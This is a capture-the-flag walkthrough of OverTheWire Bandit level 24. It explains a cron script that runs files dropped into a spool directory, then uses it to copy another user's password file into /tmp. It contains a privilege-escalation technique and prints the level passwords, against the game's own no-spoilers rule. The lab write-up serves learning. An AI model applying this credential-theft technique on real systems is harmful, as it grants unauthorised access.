# Bandit Level 23 → Level 24

## Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Solution
Note:<br/>
Not all the commands given above are required.<br/>
<br/>
Cron is a time - based job scheduler in Unix or Unix-like computer operating systems. It schedules a command or script on your server to run automatically in the background, at a designated time and date.<br/>

```
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

```
bandit23@bandit.labs.overthewire.org's password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
```
      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org
```

Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /usr/local/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!
```
bandit23@bandit:~$ ls /etc/cron.d/                                       #see the contents of the path given in the challenge
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root


bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24                      #since we want the password of bandit24, lets read cronjob_bandit24 file
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null               #@reboot -> run once after reboot
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null             # * * * * * -> run at every minute
                                                                         # the user bandit24 will run the command: /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh                      #read the content of the file /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
### Note1: Understanding the above script will help us take the next steps to get the next level password.

```
#!/bin/bash -> alert the system that the current file is a bash script and the following commands are to be executed by The Bourne — Again Shell 

Since the cronjob is run by bandit24 user, the $(whoami) will be bandit24.

cd /var/spool/$myname will navigate to cd /var/spool/bandit24 directory 

echo "Executing and deleting all scripts in /var/spool/$myname:" -> Executes and deletes all scripts in 60 seconds(cronjob)

Consider
for i in * .*; 
for i in *  -> iterate all regular files located in the current working directory
for i in .* -> iterate all hidden files located in the current directory
Hence, for i in * .* will itereate both regular and hidden files

Inside the for loop, each file undergoes the
if [ “$i” != “.” -a “$i” != “..” ]; conditional statements to check if 
the file is a "." hidden file or 
from ".." previous directory 

If the file is both NOT a hidden file and from previous directory, it will execute the file for 60 seconds before deleting it using rm -f ./$i command.

Since cronjob_bandit24.sh file is run by user bandit24, all these executable shell scripts in /var/spool/bandit24 directory will be executed by user bandit24. 

Therefore, if we create our own script in /var/spool/bandit24 directory, it will be executed as bandit24 and deleted after 60 seconds.
```
### Note2: Create a file pass.sh under /tmp/bandit23. Copy it to /var/spool/bandit24 directory so that it will be executed during cronjob. Write a script in the pass.sh file to redirect the password of bandit24 into the file bandit24pass. Make the file pass.sh and the directory bandit23 have read, write and execute permissions.
```

bandit23@bandit:~$ mkdir /tmp/mybandit23               #create a directory mybandit23 under temp
bandit23@bandit:~$ chmod 777 /tmp/mybandit23           #provide read, write, execute access for user, group and others for this directory
bandit23@bandit:~$ cd /tmp/mybandit23                  #navigate to mybandit23
bandit23@bandit:/tmp/mybandit23$ vim pass.sh           #create a file pass.sh at this path using vim
                                                       #the above command opens pass.sh file
                                                       #press i for insert mode in vim
                                                       #type the below script to redirect the password into bandit24pass file
                                                       #!/bin/bash
                                                       #cat /etc/bandit_pass/bandit24 > /tmp/mybandit23/bandit24pass
                                                       #press Esc to get into command mode
                                                       #run :wq to save and close the vim

bandit23@bandit:/tmp/mybandit23$ cat pass.sh           #when the vim is closed read the pass.sh file to check for its cotents
#!/bin/bash                                                         #the entered script is present
cat /etc/bandit_pass/bandit24 > /tmp/mybandit23/bandit24pass        #the entered script is present

bandit23@bandit:/tmp/mybandit23$ chmod 777 pass.sh                  #provide read, write, execute access for user, group and others for this file

bandit23@bandit:/tmp/mybandit23$ cp pass.sh /var/spool/bandit24/    #copy this file into /var/spool/bandit24/ to be executed by bandit24

bandit23@bandit:/tmp/mybandit23$ ls                                 #see the contents of mybandit23 directory after a minute
bandit24pass  pass.sh

bandit23@bandit:/tmp/mybandit23$ cat bandit24pass                   #read bandit24pass file to see the password of bandit24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

bandit23@bandit:/tmp/mybandit23$ rm -rf /tmp/mybandit23             #delete the created mybandit23 directory

bandit23@bandit:/tmp/mybandit23$ exit                               #exit from bandit.labs.overthewire.org
logout
Connection to bandit.labs.overthewire.org closed.
```
###Command-line help text
```
cron       -> Daemon to execute scheduled commands
crontab    -> Maintain crontab files for individual users
crontab(5) -> File formats
```
